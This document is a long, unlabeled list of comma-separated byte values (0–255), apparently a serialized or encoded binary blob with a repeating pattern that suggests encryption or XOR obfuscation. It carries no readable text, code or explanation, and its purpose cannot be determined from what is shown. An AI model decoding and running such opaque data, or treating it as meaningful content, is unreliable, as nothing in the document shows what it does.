8,86,189,173,168,130,130,136,252,254,222,223,192,42,61,35,9,25,8,117,101,105,81,90,81,178,165,173,141,133,136,241,249,232,217,216,192,54,63,44,31,0,107,124,125,87,92,65,169,179,171,136,157,136,239,251,233,208,219,207,45,33,35,17,25,10,126,102,117,94,66,73,161,162,147,157,157,242,255,252,209,221,206,40,62,47,17,4,14,114,102,112,81,66,74,172,160,169,131,130,142,226,227,235,223,222,55,62,32,10,28,3,116,102,107,81,69,75,187,164,169,151,133,144,240,250,238,214,196,214,56,45,40,2,2,1,97,100,83,93,93,177,185,188,148,157,142,232,249,238,209,196,200,50,38,48,25,5,10,108,97,111,67,77,78,162,163,170,159,158,241,254,224,202,223,197,52,38,39,17,5,11,117,100,105,87,69,80,185,167,170,140,129,142,254,248,232,219,223,207,58,62,18,24,3,106,124,97,73,91,73,181,165,173,146,154,145,244,239,240,208,194,202,44,32,54,24,3,8,98,101,97,92,94,191,181,189,148,158,129,233,248,236,200,208,201,47,60,45,16,27,15,115,103,119,83,70,75,163,167,173,130,130,143,225,227,210,222,221,49,58,33,9,29,8,117,101,105,90,89,81,178,166,173,141,128,136,242,249,237,222,216,204,54,34,52,26,3,117,96,96,94,71,64,182,187,179,149,155,146,240,240,241,215,206,205,45,33,34,12,4,9,126,120,107,88,95,78,187,190,158,158,131,234,255,224,212,198,198,49,56,50,27,28,17,113,96,112,81,69,73,172,166,171,131,140,143,255,255,234,221,192,43,59,32,23,7,7,118,123,115,85,91,82,183,190,172,142,133,133,240,250,239,208,196,214,60,39,40,2,0,9,97,102,80,64,67,180,185,188,145,152,142,232,241,236,210,196,205,52,59,43,23,26,15,114,103,118,87,68,72,162,166,173,156,158,244,252,227,202,222,200,41,62,44,22,5,7,111,124,107,83,91,72,177,164,183,145,135,139,227,227,234,223,223,206,62,62,30,20,0,106,120,105,84,70,74,180,184,178,147,157,140,238,225,239,205,199,194,44,45,43,29,24,9,126,98,116,89,71,182,160,166,147,135,132,252,230,231,208,219,210,55,36,40,22,6,16,116,103,105,76,77,66,163,167,173,156,159,140,255,254,212,218,192,42,62,41,20,6,8,125,101,108,86,89,81,180,163,176,153,129,138,236,226,227,222,216,206,55,63,44,24,3,107,127,100,74,94,70,169,187,174,150,133,136,242,249,241,212,196,205,45,36,45,12,0,3,99,102,108,92,95,74,188,190,146,153,128,234,242,225,215,198,200,60,37,38,16,25,17,118,123,109,87,71,87,178,164,168,131,133,139,255,255,238,216,195,43,52,34,10,30,7,105,123,111,86,69,73,186,164,170,150,134,144,242,229,247,215,195,214,54,37,43,2,10,9,124,126,87,88,64,170,190,165,137,155,135,232,253,236,209,196,200,46,37,43,16,26,8,112,103,118,88,67,85,191,160,169,129,132,245,224,228,208,218,220,50,59,45,8,27,15,114,100,111,87,70,80,176,160,183,147,130,150,250,229,235,194,196,201,60,62,21,24,0,106,121,99,73,89,70,168,187,170,145,132,137,243,251,239,214,199,215,54,37,40,3,12,14,98,106,108,95,94,177,160,169,144,154,156,240,243,238,200,209,206,50,36,41,17,6,16,117,122,104,88,68,86,183,164,171,130,139,137,252,254,213,223,192,42,59,38,9,29,9,104,124,109,81,68,77,178,166,176,147,129,138,236,230,236,195,193,206,34,33,43,31,30,117,125,125,87,93,65,169,190,174,150,133,143,242,249,241,209,195,206,45,34,41,12,3,2,126,120,97,95,65,84,188,163,150,128,137,243,250,252,215,216,211,52,49,47,15,26,12,112,123,101,81,71,87,182,161,171,131,135,143,226,225,225,193,198,52,62,61,30,26,1,105,120,103,85,69,72,182,164,173,154,155,139,243,228,247,212,199,214,61,34,40,2,6,1,124,126,95,93,64,170,184,164,151,134,137,245,229,238,218,217,209,54,38,46,13,4,11,113,121,99,90,69,85,188,162,180,155,133,235,251,226,212,199,192,52,38,47,16,24,18,118,125,113,80,78,80,181,164,169,140,141,138,254,248,238,216,194,212,53,38,11,28,0,119,103,100,80,88,83,181,165,175,149,153,145,244,238,237,205,196,201,49,57,40,27,5,21,126,97,116,95,74,182,160,166,150,153,156,243,243,243,220,220,207,47,56,41,14,2,4,109,101,104,82,89,66,163,160,174,159,159,141,249,254,215,213,221,50,57,34,9,30,19,116,112,111,79,80,73,174,174,172,144,154,143,245,231,246,223,216,204,54,34,52,25,11,118,96,103,95,71,72,182,187,179,156,152,146,245,254,236,206,207,207,51,58,44,17,4,22,123,96,104,66,65,77,161,162,144,128,137,242,249,252,210,198,207,51,56,50,18,24,15,110,101,107,77,71,78,178,185,174,158,152,139,248,226,244,221,194,53,32,41,31,7,0,118,120,115,82,91,82,180,176,172,142,142,141,243,250,227,217,217,202,60,37,53,24,0,20,125,101,86,64,72,181,185,188,151,152,142,232,251,234,210,196,202,49,59,37,23,26,11,115,103,118,86,70,85,188,164,169,129,134,247,254,253,208,220,220,48,63,45,8,31,18,117,126,108,78,71,76,179,186,173,153,153,136,251,230,245,214,223,192,53,35,11,28,0,116,103,98,85,91,83,182,186,175,143,155,142,238,227,235,208,218,203,51,39,54,29,5,8,98,97,111,92,94,183,186,189,146,147,156,244,255,237,200,216,210,49,62,44,14,0,5,112,122,98,80,68,86,188,167,171,130,130,148,251,229,214,192,199,63,58,60,28,19,19,119,125,108,79,80,76,174,165,164,144,154,141,240,231,246,217,197,200,34,43,45,28,30,113,127,125,84,83,92,179,184,173,136,144,143,242,228,229,212,198,208,51,37,55,17,13,22,119,102,107,66,68,74,161,163,158,157,157,247,251,226,201,220,206,53,37,46,23,26,17,117,101,112,87,65,74,172,164,168,157,152,140,252,226,244,219,198,54,32,39,18,7,9,114,102,105,87,91,82,179,185,172,142,131,136,240,250,238,211,217,204,55,56,45,27,1,20,124,99,75,90,73,183,167,168,144,134,142,252,229,237,215,218,209,59,59,43,22,7,23,113,103,104,67,68,75,191,191,170,153,131,235,245,227,202,217,200,41,57,45,22,5,10,114,121,113,81,67,77,173,164,174,140,128,140,227,231,234,220,223,192,60,62,22,25,0,106,125,101,73,90,70,168,185,171,145,132,141,243,251,234,215,199,215,48,33,54,23,12,21,118,103,106,65,65,182,160,163,158,154,156,242,251,237,200,208,199,47,49,41,19,27,13,115,122,98,87,89,72,189,166,181,159,130,137,225,225,211,221,221,50,56,60,29,18,19,124,123,108,79,88,76,174,161,168,144,154,141,243,249,237,217,216,201,58,33,52,29,30,117,122,96,74,82,68,169,179,175,149,133,141,240,249,241,219,195,208,57,33,42,12,7,11,125,120,104,92,66,84,190,167,150,128,134,247,231,228,211,198,206,54,59,50,26,25,17,115,100,109,77,68,72,172,167,173,131,128,140,252,255,236,193,193,48,61,61,18,30,28,115,124,115,86,93,76,175,177,177,155,143,141,237,238,235,210,217,207,63,37,53,22,7,9,97,97,83,64,72,177,167,160,148,152,147,244,249,239,207,221,206,51,59,42,18,26,15,121,121,107,94,70,85,189,162,180,157,129,246,224,227,208,199,196,60,38,38,16,27,18,115,123,113,86,64,77,173,162,174,140,133,141,227,237,234,223,223,206,63,62,23,27,0,106,122,96,87,70,73,189,165,173,144,153,145,245,226,240,210,193,215,55,38,40,3,12,8,127,127,97,95,67,171,191,165,138,147,136,233,251,235,214,197,200,47,59,40,19,27,5,117,122,99,86,89,75,186,166,181,159,128,148,253,228,214,192,201,54,57,60,22,18,19,125,122,111,79,93,81,187,160,173,141,133,130,241,249,236,214,216,207,59,34,52,31,1,107,124,102,74,88,67,183,166,167,148,152,146,244,253,236,206,196,207,45,38,44,12,7,9,125,120,110,66,74,77,188,190,151,152,157,243,243,252,209,222,205,40,48,44,15,16,5,115,123,109,81,68,87,177,172,182,157,135,136,226,234,244,212,197,43,52,40,23,7,4,119,123,115,92,91,79,175,176,168,142,133,133,237,231,232,210,217,194,35,32,45,31,31,8,123,126,80,84,93,177,185,162,137,156,141,232,251,234,210,196,207,55,59,42,22,26,11,116,103,118,94,70,85,191,170,169,129,132,246,254,253,212,219,193,41,59,44,21,5,13,114,100,111,85,91,77,179,164,183,145,133,139,227,224,236,223,223,200,59,62,19,21,29,117,126,98,73,95,78,168,176,170,146,132,143,241,251,235,217,218,207,50,39,54,24,24,11,121,98,116,93,66,181,160,164,150,154,156,243,254,238,200,223,204,47,48,37,19,27,12,115,100,119,81,68,75,163,166,172,159,159,129,249,254,214,219,221,63,58,34,9,28,14,117,101,104,80,89,81,179,161,176,148,143,151,245,231,232,195,197,213,58,37,41,1,4,116,96,96,87,90,92,189,190,173,136,158,143,239,250,229,211,219,205,49,36,55,22,5,11,99,100,109,95,95,72,184,190,150,148,128,234,248,225,215,198,200,61,37,43,16,25,17,114,99,112,89,64,87,177,167,168,131,141,137,255,255,237,217,195,43,59,36,10,25,7,105,114,107,86,69,71,175,184,171,147,155,140,245,250,236,208,196,214,62,32,43,2,11,9,97,100,95,93,93,177,178,161,137,153,143,245,229,234,214,217,209,50,35,48,22,1,10,108,101,104,93,88,79,188,162,180,157,135,246,224,228,213,199,199,61,38,43,20,27,18,118,121,113,91,65,77,173,175,171,146,153,136,247,248,237,218,193,212,58,32,11,25,9,119,103,105,81,70,79,181,184,178,151,156,143,238,230,233,205,192,205,49,57,42,29,6,21,118,106,116,88,65,182,160,166,149,135,128,253,230,239,213,219,210,59,57,44,14,4,8,112,122,111,83,89,73,182,184,169,154,129,148,252,227,203,221,198,55,39,32,21,24,19,118,120,111,79,80,73,176,187,170,147,154,130,248,228,246,216,196,203,34,32,40,28,30,112,127,99,74,89,68,169,179,167,149,133,141,241,250,241,212,206,208,56,35,42,12,0,9,99,97,111,66,71,72,191,190,151,158,128,234,254,231,212,198,207,50,37,42,20,4,14,113,101,112,81,90,79,182,164,182,152,133,139,226,230,232,220,222,55,56,32,10,19,2,105,123,105,85,69,76,179,186,177,148,133,141,237,230,239,209,217,195,58,56,46,22,2,20,125,96,85,64,70,180,186,188,145,153,142,232,250,232,207,209,203,46,46,46,19,26,13,112,100,118,95,67,72,162,171,172,129,130,254,224,233,210,217,220,53,38,39,18,24,18,119,113,108,78,71,78,176,186,173,147,132,150,247,229,245,214,203,201,33,36,22,30,29,117,121,97,73,82,77,181,165,168,144,132,141,245,230,240,210,199,201,44,33,40,30,24,14,122,98,116,85,65,171,188,166,138,159,132,247,230,237,213,216,210,54,62,44,14,6,10,109,98,106,81,89,72,188,166,181,154,129,148,253,228,214,192,201,55,57,60,17,24,14,104,124,109,82,68,74,182,187,173,153,135,151,240,231,232,195,199,200,63,63,33,31,3,107,121,98,74,89,72,180,166,169,149,155,146,251,248,236,206,195,200,48,58,43,21,25,3,119,120,97,90,65,84,186,190,151,154,128,234,254,228,201,219,206,53,37,47,22,26,17,119,123,105,89,71,87,177,167,168,131,135,139,255,255,239,216,195,43,62,34,10,26,8,116,102,109,93,88,82,186,185,172,142,132,143,240,250,226,211,217,195,56,56,32,29,1,20,116,126,95,91,64,170,186,165,137,154,134,232,255,236,209,196,207,48,59,44,24,7,23,118,108,107,67,76,64,162,171,170,159,158,247,254,253,209,220,193,41,50,47,22,5,14,115,121,113,90,67,77,173,162,175,140,132,130,227,227,232,220,223,207,33,42,19,29,29,117,127,124,80,93,83,189,186,172,143,154,140,238,229,228,208,218,207,48,39,54,25,12,21,122,97,106,65,70,171,184,169,151,135,130,245,248,243,210,219,207,47,61,41,16,27,15,115,122,109,87,68,86,186,164,171,130,135,138,252,254,212,223,192,42,63,35,9,29,8,104,122,111,81,68,79,176,187,174,148,135,151,249,224,246,222,195,213,54,39,42,1,7,107,124,103,87,71,68,180,184,179,150,145,146,240,253,239,206,196,208,48,33,42,12,0,3,126,120,106,92,66,84,187,161,149,128,133,242,231,229,210,198,206,48,59,50,23,25,12,110,99,104,80,90,73,182,185,163,151,152,141,255,225,244,223,222,48,63,32,10,31,0,119,102,106,83,69,76,182,186,177,147,155,141,247,231,247,215,204,203,35,38,40,31,31,13,121,96,75,93,66,170,186,168,148,134,142,246,251,242,215,218,204,46,38,40,16,26,8,117,121,105,88,88,77,189,161,180,158,131,235,253,229,215,199,199,48,38,42,18,5,6,112,122,113,82,68,80,182,162,170,140,135,138,253,248,232,215,223,204,63,32,11,21,3,106,126,104,84,70,74,189,184,178,149,153,140,238,230,232,211,218,207,50,57,44,24,24,10,119,98,116,91,67,182,160,166,149,154,156,246,249,243,220,209,210,59,58,47,14,3,13,109,103,108,81,89,74,187,184,171,151,159,139,254,224,203,223,195,42,60,39,20,6,8,125,120,114,82,81,81,177,162,174,141,130,151,247,237,235,195,194,200,60,63,32,20,30,115,120,96,74,91,66,169,189,168,136,158,135,242,228,239,211,198,208,53,37,42,12,3,9,99,102,96,66,71,74,191,190,149,157,157,242,252,225,201,222,203,40,49,38,15,16,9,112,123,104,83,90,74,183,164,182,157,132,139,226,231,239,193,192,51,62,61,17,26,28,117,125,110,72,90,76,177,164,164,155,155,132,245,231,247,217,196,214,56,34,53,29,2,10,97,106,86,64,71,181,186,188,150,159,147,240,255,242,218,220,207,46,37,48,20,14,10,108,96,106,93,88,72,182,191,172,159,128,235,252,224,202,216,199,52,38,45,22,27,18,123,127,113,86,67,78,173,160,170,140,129,141,254,248,236,223,193,212,60,32,22,0,1,117,122,124,85,95,83,178,191,178,154,152,143,238,226,237,205,206,201,49,57,42,25,24,1,118,127,97,95,64,171,181,163,138,153,134,244,230,236,221,216,210,52,63,49,17,2,14,109,96,106,76,68,76,190,184,160,151,130,148,245,226,214,192,192,50,58,60,18,25,19,118,113,114,82,89,79,174,161,174,144,154,139,243,228,246,219,193,213,61,42,52,25,1,117,96,103,84,71,68,176,187,179,150,156,146,241,241,241,209,196,206,45,35,41,12,2,2,126,120,110,87,66,84,190,163,150,128,131,243,249,252,213,223,211,53,48,47,15,25,12,112,123,100,81,71,87,184,161,171,131,131,141,226,229,238,193,192,51,62,61,30,26,1,105,124,106,85,69,70,182,164,164,154,155,139,242,228,247,215,217,204,60,37,53,26,6,20,117,106,75,91,66,180,167,161,151,134,137,252,248,242,211,218,207,46,32,44,16,26,11,116,103,118,94,64,85,187,165,169,129,139,246,254,253,213,219,193,41,56,42,21,5,7,112,100,100,84,91,74,181,164,183,148,132,139,227,226,236,223,223,192,62,62,18,27,29,112,120,98,73,93,77,168,185,170,146,132,142,242,229,240,216,198,202,44,32,46,30,24,14,127,127,110,90,67,171,180,160,148,135,129,247,251,243,213,221,204,47,48,46,14,6,4,112,122,104,84,71,86,185,173,181,150,129,137,225,229,212,192,197,63,39,33,22,24,19,117,120,114,82,93,76,174,163,175,141,132,131,236,226,232,221,216,192,60,63,46,26,3,107,124,97,84,71,71,188,166,167,150,152,146,251,252,241,212,192,205,45,36,41,18,25,14,127,101,117,90,71,73,161,167,148,128,137,241,250,252,210,222,205,40,61,44,18,4,11,119,102,112,88,67,87,182,163,182,152,134,139,226,230,233,193,192,50,61,61,30,24,28,117,123,110,72,91,75,177,164,173,147,155,140,246,231,247,215,204,203,35,44,32,2,0,13,124,126,86,88,93,191,189,188,150,155,141,232,254,231,207,208,206,51,59,36,20,26,10,120,121,99,93,70,85,185,161,169,129,133,242,253,253,208,216,220,54,50,51,20,28,12,111,124,111,78,67,75,176,186,162,148,153,131,254,229,245,223,198,202,33,33,21,0,5,112,122,124,84,88,77,168,188,174,146,132,141,241,230,240,215,195,215,52,34,54,31,5,11,98,98,104,92,94,180,191,160,138,153,134,233,254,232,200,220,203,49,36,36,19,6,16,121,98,106,76,69,76,163,160,174,130,135,141,255,254,210,192,193,62,58,60,20,31,19,116,121,111,79,91,73,176,187,172,148,154,138,246,228,246,222,198,203,34,34,42,28,30,126,126,96,74,92,67,169,179,169,136,153,138,241,228,235,211,198,208,48,37,42,12,13,14,99,109,97,66,71,77,191,190,149,157,128,234,251,229,212,198,203,48,37,46,27,4,9,118,101,112,88,68,87,180,173,171,131,131,137,252,255,235,221,195,43,56,37,20,7,4,112,102,102,92,88,82,180,185,175,142,128,142,240,250,232,211,196,214,61,34,53,26,5,20,121,96,85,64,72,182,186,188,146,159,142,232,241,235,207,217,202,46,38,47,19,26,8,113,121,105,88,69,85,182,163,170,129,138,247,253,253,214,223,194,41,58,44,8,17,6,114,100,110,82,69,80,185,167,170,140,133,142,254,248,225,219,223,207,53,35,11,29,1,116,103,104,84,91,83,176,189,175,143,158,136,238,226,234,205,193,201,50,57,34,3,6,10,127,127,106,93,64,171,190,168,138,158,131,247,230,231,200,216,201,50,36,47,27,6,16,121,103,106,76,65,73,190,184,169,156,159,136,251,227,203,216,200,55,39,34,23,27,19,125,125,111,79,90,78,174,161,171,144,154,130,240,231,246,215,196,200,34,35,45,28,30,114,121,125,95,93,92,189,184,173,136,152,146,245,251,236,206,196,204,51,58,41,25,25,10,122,102,117,88,65,84,190,165,150,128,132,246,249,252,215,216,206,40,62,45,18,4,15,112,123,104,87,71,87,181,172,171,131,128,136,255,255,225,223,195,43,56,34,10,30,8,116,102,106,87,91,82,181,185,177,144,128,141,237,225,238,204,198,195,35,32,43,28,31,12,97,96,82,93,93,190,178,161,137,153,136,232,251,234,210,196,203,46,47,36,16,26,8,121,100,118,88,68,72,162,160,172,156,158,255,248,253,215,211,193,41,62,46,22,5,8,114,121,113,85,66,77,173,175,174,140,135,141,227,225,237,220,223,200,60,62,23,27,0,106,124,105,84,70,72,179,165,167,151,154,145,244,251,232,215,199,215,50,39,40,3,4,1,98,107,107,92,94,181,160,161,159,154,156,243,251,237,200,220,204,50,36,37,23,6,16,112,98,119,84,77,75,163,172,168,156,159,129,252,254,222,217,192,42,56,37,9,30,7,104,120,109,81,68,74,174,162,170,144,154,137,241,231,246,222,196,200,34,32,44,31,30,118,96,96,81,90,92,177,187,173,136,154,143,242,228,233,209,198,208,52,36,55,25,13,11,99,98,96,95,95,76,191,163,139,153,132,247,231,230,208,198,198,51,37,38,19,26,17,113,101,112,83,67,74,172,173,174,131,131,142,226,224,237,223,222,54,32,32,16,26,28,112,115,110,72,94,79,178,164,175,150,133,144,244,228,247,211,194,203,35,44,32,31,31,12,125,99,75,89,66,183,167,167,148,134,135,242,248,242,208,217,207,46,47,45,16,26,3,117,100,118,95,66,85,186,164,180,157,131,245,224,224,202,220,195,52,38,40,20,27,18,123,126,113,81,66,78,173,166,183,152,141,139,227,224,224,223,223,207,52,62,19,24,0,106,120,98,73,91,73,181,165,172,145,154,145,243,229,237,205,206,206,49,57,42,29,24,15,121,98,116,89,66,181,160,163,148,154,156,253,249,238,200,219,200,47,56,42,14,1,15,115,122,106,83,89,78,187,165,181,154,131,138,225,227,222,192,200,52,57,60,19,24,19,117,112,111,79,90,68,179,187,165,152,154,131,243,228,246,218,198,213,62,37,41,1,1,118,126,125,81,82,92,176,185,174,136,154,138,239,251,234,206,199,200,51,58,41,17,25,14,123,101,117,94,69,84,191,171,139,154,130,244,231,226,215,198,200,51,56,50,23,17,12,110,102,101,77,69,72,178,185,171,157,152,142,249,226,244,223,192,53,32,38,31,7,0,113,123,115,86,93,82,183,190,172,142,130,143,243,250,237,210,196,214,54,39,40,2,0,12,97,100,80,64,68,181,185,188,151,152,147,253,255,239,207,217,200,46,35,42,13,2,9,114,121,109,93,88,72,182,162,180,152,139,246,224,224,222,199,197,49,56,51,22,24,18,119,112,108,78,70,77,179,186,170,144,132,150,246,230,232,194,193,203,33,32,31,29,29,112,127,98,73,90,77,181,165,167,151,153,145,240,228,240,217,206,215,55,38,40,3,4,21,124,107,105,65,75,179,160,160,158,135,137,247,248,243,213,216,210,55,62,44,14,0,13,115,122,105,88,89,79,187,165,181,152,135,148,250,229,203,216,193,52,39,41,20,27,19,125,124,111,79,92,78,174,165,171,144,154,138,243,231,246,218,198,200,34,35,47,28,30,117,122,125,86,92,92,183,191,173,136,153,146,241,254,236,206,196,204,51,58,41,23,25,3,123,102,117,86,66,84,180,170,150,128,136,247,249,252,210,218,206,40,48,42,18,4,15,118,123,107,86,90,79,179,167,182,150,132,136,226,234,237,220,222,53,63,61,22,19,28,114,120,109,72,88,76,178,164,174,154,134,144,241,224,247,216,205,214,55,32,43,2,1,20,125,101,86,64,67,191,186,188,147,157,147,253,253,236,207,219,201,46,38,42,16,26,14,113,103,118,88,68,72,162,162,172,156,158,241,249,253,222,221,220,55,57,45,8,27,15,111,126,110,83,91,79,183,186,168,151,153,138,250,230,245,217,194,212,59,36,22,0,6,115,103,96,92,70,71,182,187,178,148,154,145,242,238,237,205,192,194,49,57,40,30,5,21,122,103,106,65,64,179,160,167,158,154,156,243,250,237,200,216,206,50,36,40,17,6,16,113,98,119,83,76,86,182,166,171,130,139,148,254,231,214,192,198,53,39,32,18,6,15,113,123,114,91,68,76,187,166,176,148,131,151,242,237,246,220,193,203,34,35,41,1,5,127,125,125,85,82,65,169,188,166,136,145,141,241,228,234,209,219,204,57,39,55,23,6,8,99,96,107,95,95,78,184,163,139,148,132,234,242,232,201,216,202,54,37,40,15,27,10,115,123,109,85,90,77,182,185,174,155,134,149,252,255,235,219,195,43,61,36,10,19,8,105,123,107,86,69,74,178,164,170,149,134,144,243,239,234,204,199,202,62,56,32,29,2,20,126,97,75,95,70,183,167,166,150,152,147,246,251,239,207,219,206,51,59,37,20,26,15,121,121,110,93,70,85,190,191,171,154,131,235,244,229,202,223,198,41,57,43,22,5,14,111,127,101,83,91,76,176,164,183,145,132,139,227,226,234,223,223,200,56,62,30,27,0,106,122,98,87,70,73,189,165,174,150,153,145,240,225,240,215,193,215,48,38,40,3,4,9,127,127,108,89,67,171,191,164,138,152,135,233,243,235,214,197,206,48,36,47,21,6,16,120,102,105,76,76,66,163,164,173,159,159,140,255,254,214,219,192,42,60,32,23,6,6,116,120,114,91,92,76,174,164,168,141,129,140,236,228,235,221,216,207,55,63,45,30,3,107,123,100,74,93,71,169,190,170,150,133,134,242,249,241,214,195,205,45,35,46,12,2,13,99,97,109,92,95,73,190,190,151,154,128,234,248,225,215,198,201,60,37,45,23,25,17,119,123,107,86,71,87,185,172,171,131,140,128,226,225,237,220,222,62,63,61,16,28,28,119,123,109,72,89,78,178,164,175,145,134,144,242,226,247,209,194,214,63,33,43,2,5,9,124,126,80,91,64,170,184,160,151,134,142,245,248,242,213,219,207,46,36,46,13,3,3,113,121,109,94,70,85,188,171,180,157,129,246,224,231,215,199,195,61,38,45,20,27,18,112,120,108,78,65,73,176,186,163,147,153,140,249,248,233,218,193,212,53,35,22,0,5,115,122,124,86,95,83,183,176,178,144,157,143,238,238,240,208,206,202,44,35,42,29,24,14,126,98,116,89,70,182,160,167,151,135,137,253,251,243,220,208,207,47,58,44,19,27,4,114,103,119,82,71,86,184,172,181,159,129,138,225,228,214,221,221,62,57,33,9,25,9,104,120,105,79,80,78,176,187,164,145,135,151,245,224,235,195,195,201,60,63,42,20,30,115,127,99,74,91,65,169,190,169,149,133,138,243,250,241,211,197,205,45,33,40,17,25,9,123,120,96,86,66,84,190,171,150,128,132,246,250,252,221,223,206,40,60,42,15,25,4,110,110,109,83,90,72,177,164,182,151,129,136,226,235,235,193,199,62,32,39,21,25,28,118,123,115,92,90,79,175,190,173,144,155,133,247,250,235,212,199,214,58,56,43,24,2,20,125,96,85,64,71,191,167,160,145,155,147,246,253,242,209,223,204,46,39,46,19,26,11,114,100,118,93,65,72,162,163,172,129,131,240,224,227,214,217,220,50,59,46,8,31,11,114,100,105,87,91,76,182,186,173,146,135,150,251,229,245,220,199,201,33,37,30,29,29,113,115,124,93,89,78,168,177,172,143,158,133,243,251,237,211,196,215,55,44,54,30,7,8,98,103,107,65,66,191,160,164,151,153,156,252,243,243,213,220,207,47,63,40,14,1,4,109,111,107,82,89,66,191,165,181,153,135,137,225,230,210,192,197,49,39,35,16,24,19,115,101,110,84,89,81,177,165,174,141,134,131,236,236,233,222,216,200,60,63,45,27,3,107,123,96,84,71,66,180,187,179,156,157,143,239,249,235,206,196,203,45,39,42,18,25,13,126,101,117,92,71,73,161,160,148,128,129,255,231,224,214,216,211,50,56,50,16,31,12,110,110,101,80,90,74,185,185,162,157,134,149,255,255,236,218,195,43,53,32,20,7,3,116,123,115,81,90,79,175,189,175,142,143,132,240,250,235,208,199,214,57,37,40,2,6,12,124,126,84,89,93,190,179,188,147,153,141,232,250,239,210,196,201,53,38,48,18,5,23,118,109,118,90,71,75,162,163,180,157,138,246,224,225,214,217,220,52,59,46,8,26,11,113,100,109,78,64,74,176,186,170,146,135,150,251,228,232,194,203,205,60,62,20,30,29,117,124,97,73,90,78,182,165,171,146,153,145,247,227,237,205,193,200,44,39,45,3,2,10,124,127,108,93,67,171,185,166,151,135,135,246,230,238,220,197,199,49,58,49,22,27,8,121,103,119,86,69,72,163,164,168,159,159,142,254,224,203,212,195,42,59,38,20,6,12,116,123,114,80,88,76,174,163,169,144,154,141,241,249,235,215,216,193,60,33,52,21,30,119,120,96,74,83,68,169,179,167,136,144,138,241,228,238,211,198,208,51,32,42,12,7,15,99,97,104,95,95,77,190,160,139,157,157,254,243,225,201,211,198,53,37,38,26,4,9,118,102,112,80,68,87,185,173,171,131,128,136,252,255,237,223,195,43,57,36,23,7,6,113,102,109,83,69,74,183,186,177,154,155,137,247,231,247,215,192,214,55,34,53,26,1,10,97,107,75,91,71,183,167,165,145,134,135,253,229,232,215,218,209,50,59,44,24,7,23,114,103,104,67,67,64,162,171,172,156,158,240,253,253,222,211,193,41,57,44,22,5,9,122,100,101,87,70,80,179,163,183,145,130,150,251,230,235,194,196,212,61,42,22,0,5,118,121,124,87,82,83,183,188,172,143,152,143,238,230,229,208,218,204,48,39,54,28,6,8,98,107,108,95,94,191,190,189,147,147,129,233,242,230,213,197,201,49,57,49,19,4,13,109,101,111,76,69,77,190,184,170,157,129,148,255,224,214,192,195,50,58,60,29,25,19,115,127,114,80,91,79,174,174,174,141,131,141,241,249,233,214,197,213,63,43,52,20,0,117,96,103,74,82,71,180,166,172,149,155,146,244,241,241,214,195,206,45,46,41,12,13,12,126,120,107,92,65,84,187,160,150,128,135,243,250,252,209,222,211,60,62,47,15,25,8,112,123,106,80,71,87,179,162,171,131,129,138,226,230,238,193,193,50,62,61,30,25,28,115,124,110,72,94,79,177,164,168,146,134,144,243,226,233,204,205,200,35,39,33,31,31,1,116,99,75,85,64,183,167,168,150,152,147,243,248,242,213,223,204,46,38,45,19,26,13,112,100,118,87,65,72,162,164,171,129,135,240,224,228,211,217,220,55,59,46,8,26,9,114,100,107,87,91,69,183,186,162,148,135,150,251,230,245,218,203,201,33,35,21,30,29,112,123,97,73,91,75,182,165,166,145,132,137,245,230,240,211,207,202,44,33,40,30,24,13,125,98,116,85,70,171,187,166,138,146,131,247,230,237,213,216,210,49,59,44,14,3,15,109,99,108,76,71,79,189,184,174,159,159,143,251,227,203,222,199,42,56,40,9,24,12,118,101,109,81,68,76,187,166,176,146,143,138,236,231,234,222,216,201,58,34,52,20,0,107,126,105,74,91,66,183,166,168,150,152,146,241,252,236,206,197,201,45,37,44,12,3,14,125,120,107,95,95,72,184,163,139,155,132,234,251,233,201,217,202,54,37,43,18,4,13,123,102,112,88,66,87,178,173,182,153,135,139,226,229,233,193,193,63,61,61,21,25,2,105,126,109,85,69,77,183,185,177,155,134,144,247,238,247,209,199,200,35,32,40,31,31,12,120,99,75,91,66,170,191,166,137,156,141,246,229,236,209,196,207,55,38,48,25,2,23,116,108,118,93,64,75,162,163,180,159,132,246,224,232,210,199,196,53,59,51,23,29,15,111,113,105,78,64,75,176,186,169,145,135,150,254,230,232,194,192,205,60,62,22,30,29,127,124,124,84,90,77,168,189,175,143,157,142,243,251,236,213,218,201,57,57,45,29,6,21,122,127,108,90,67,171,188,165,138,158,137,233,250,234,214,197,202,47,62,43,19,27,9,113,100,119,81,68,75,163,165,173,159,159,139,248,254,208,219,221,55,58,34,9,29,13,117,101,105,86,89,81,183,163,176,148,129,151,243,228,232,195,199,203,34,42,45,28,30,127,121,125,95,83,92,179,184,173,136,156,146,243,240,236,206,199,201,45,47,35,12,13,9,126,120,104,66,67,65,188,190,149,156,131,234,250,226,212,198,204,55,56,50,23,27,17,118,111,112,88,69,73,172,172,171,158,152,128,250,226,244,223,199,43,58,41,10,29,3,119,102,104,86,69,75,182,185,177,144,129,144,249,224,247,216,193,200,35,34,43,2,5,14,124,126,95,92,67,170,191,169,137,155,140,245,229,235,207,223,202,51,59,37,24,7,23,117,103,107,67,68,74,191,191,175,158,158,246,251,253,211,223,194,41,59,45,21,5,13,118,121,113,84,66,80,179,175,183,149,134,136,227,229,234,194,194,205,60,62,30,24,29,116,115,124,81,89,77,168,190,172,143,152,139,243,251,238,209,196,215,56,34,54,27,7,8,98,107,106,65,69,176,160,161,148,153,156,241,248,238,200,218,203,50,36,46,23,27,14,120,122,99,82,71,86,187,165,181,152,135,137,225,226,209,192,198,62,39,38,22,24,19,125,123,114,81,92,76,174,174,168,141,129,131,236,231,238,221,216,201,63,63,33,21,3,107,121,97,84,71,68,180,187,179,157,155,143,239,254,236,206,192,202,45,36,34,17,25,10,125,101,117,91,71,73,161,165,146,128,133,240,231,228,215,216,211,52,37,47,23,25,17,112,97,112,82,78,87,184,167,168,131,131,149,251,228,233,193,197,62,61,61,30,27,1,105,124,107,85,69,78,177,164,169,148,134,144,245,239,234,204,197,203,62,56,41,27,2,20,116,102,75,89,71,170,188,161,151,134,138,244,248,242,211,221,204,46,46,40,13,14,13,108,96,111,93,88,79,162,171,174,156,158,241,255,253,211,219,193,41,57,42,22,5,15,114,100,100,84,70,80,178,166,169,140,131,139,254,248,224,221,194,212,56,38,11,21,9,119,103,98,92,91,83,183,185,175,143,156,136,243,251,238,213,218,207,57,57,34,31,6,21,120,98,105,65,66,179,189,189,158,159,156,245,242,243,221,221,204,47,48,47,14,15,10,112,122,104,85,89,78,191,165,181,151,129,138,225,224,213,192,197,48,58,60,19,27,13,104,120,110,82,68,76,177,166,176,147,130,151,242,226,235,195,195,200,60,63,32,20,30,118,121,96,74,92,69,169,184,166,136,144,142,241,228,233,206,193,203,48,58,47,16,7,22,122,108,117,95,71,74,161,162,139,152,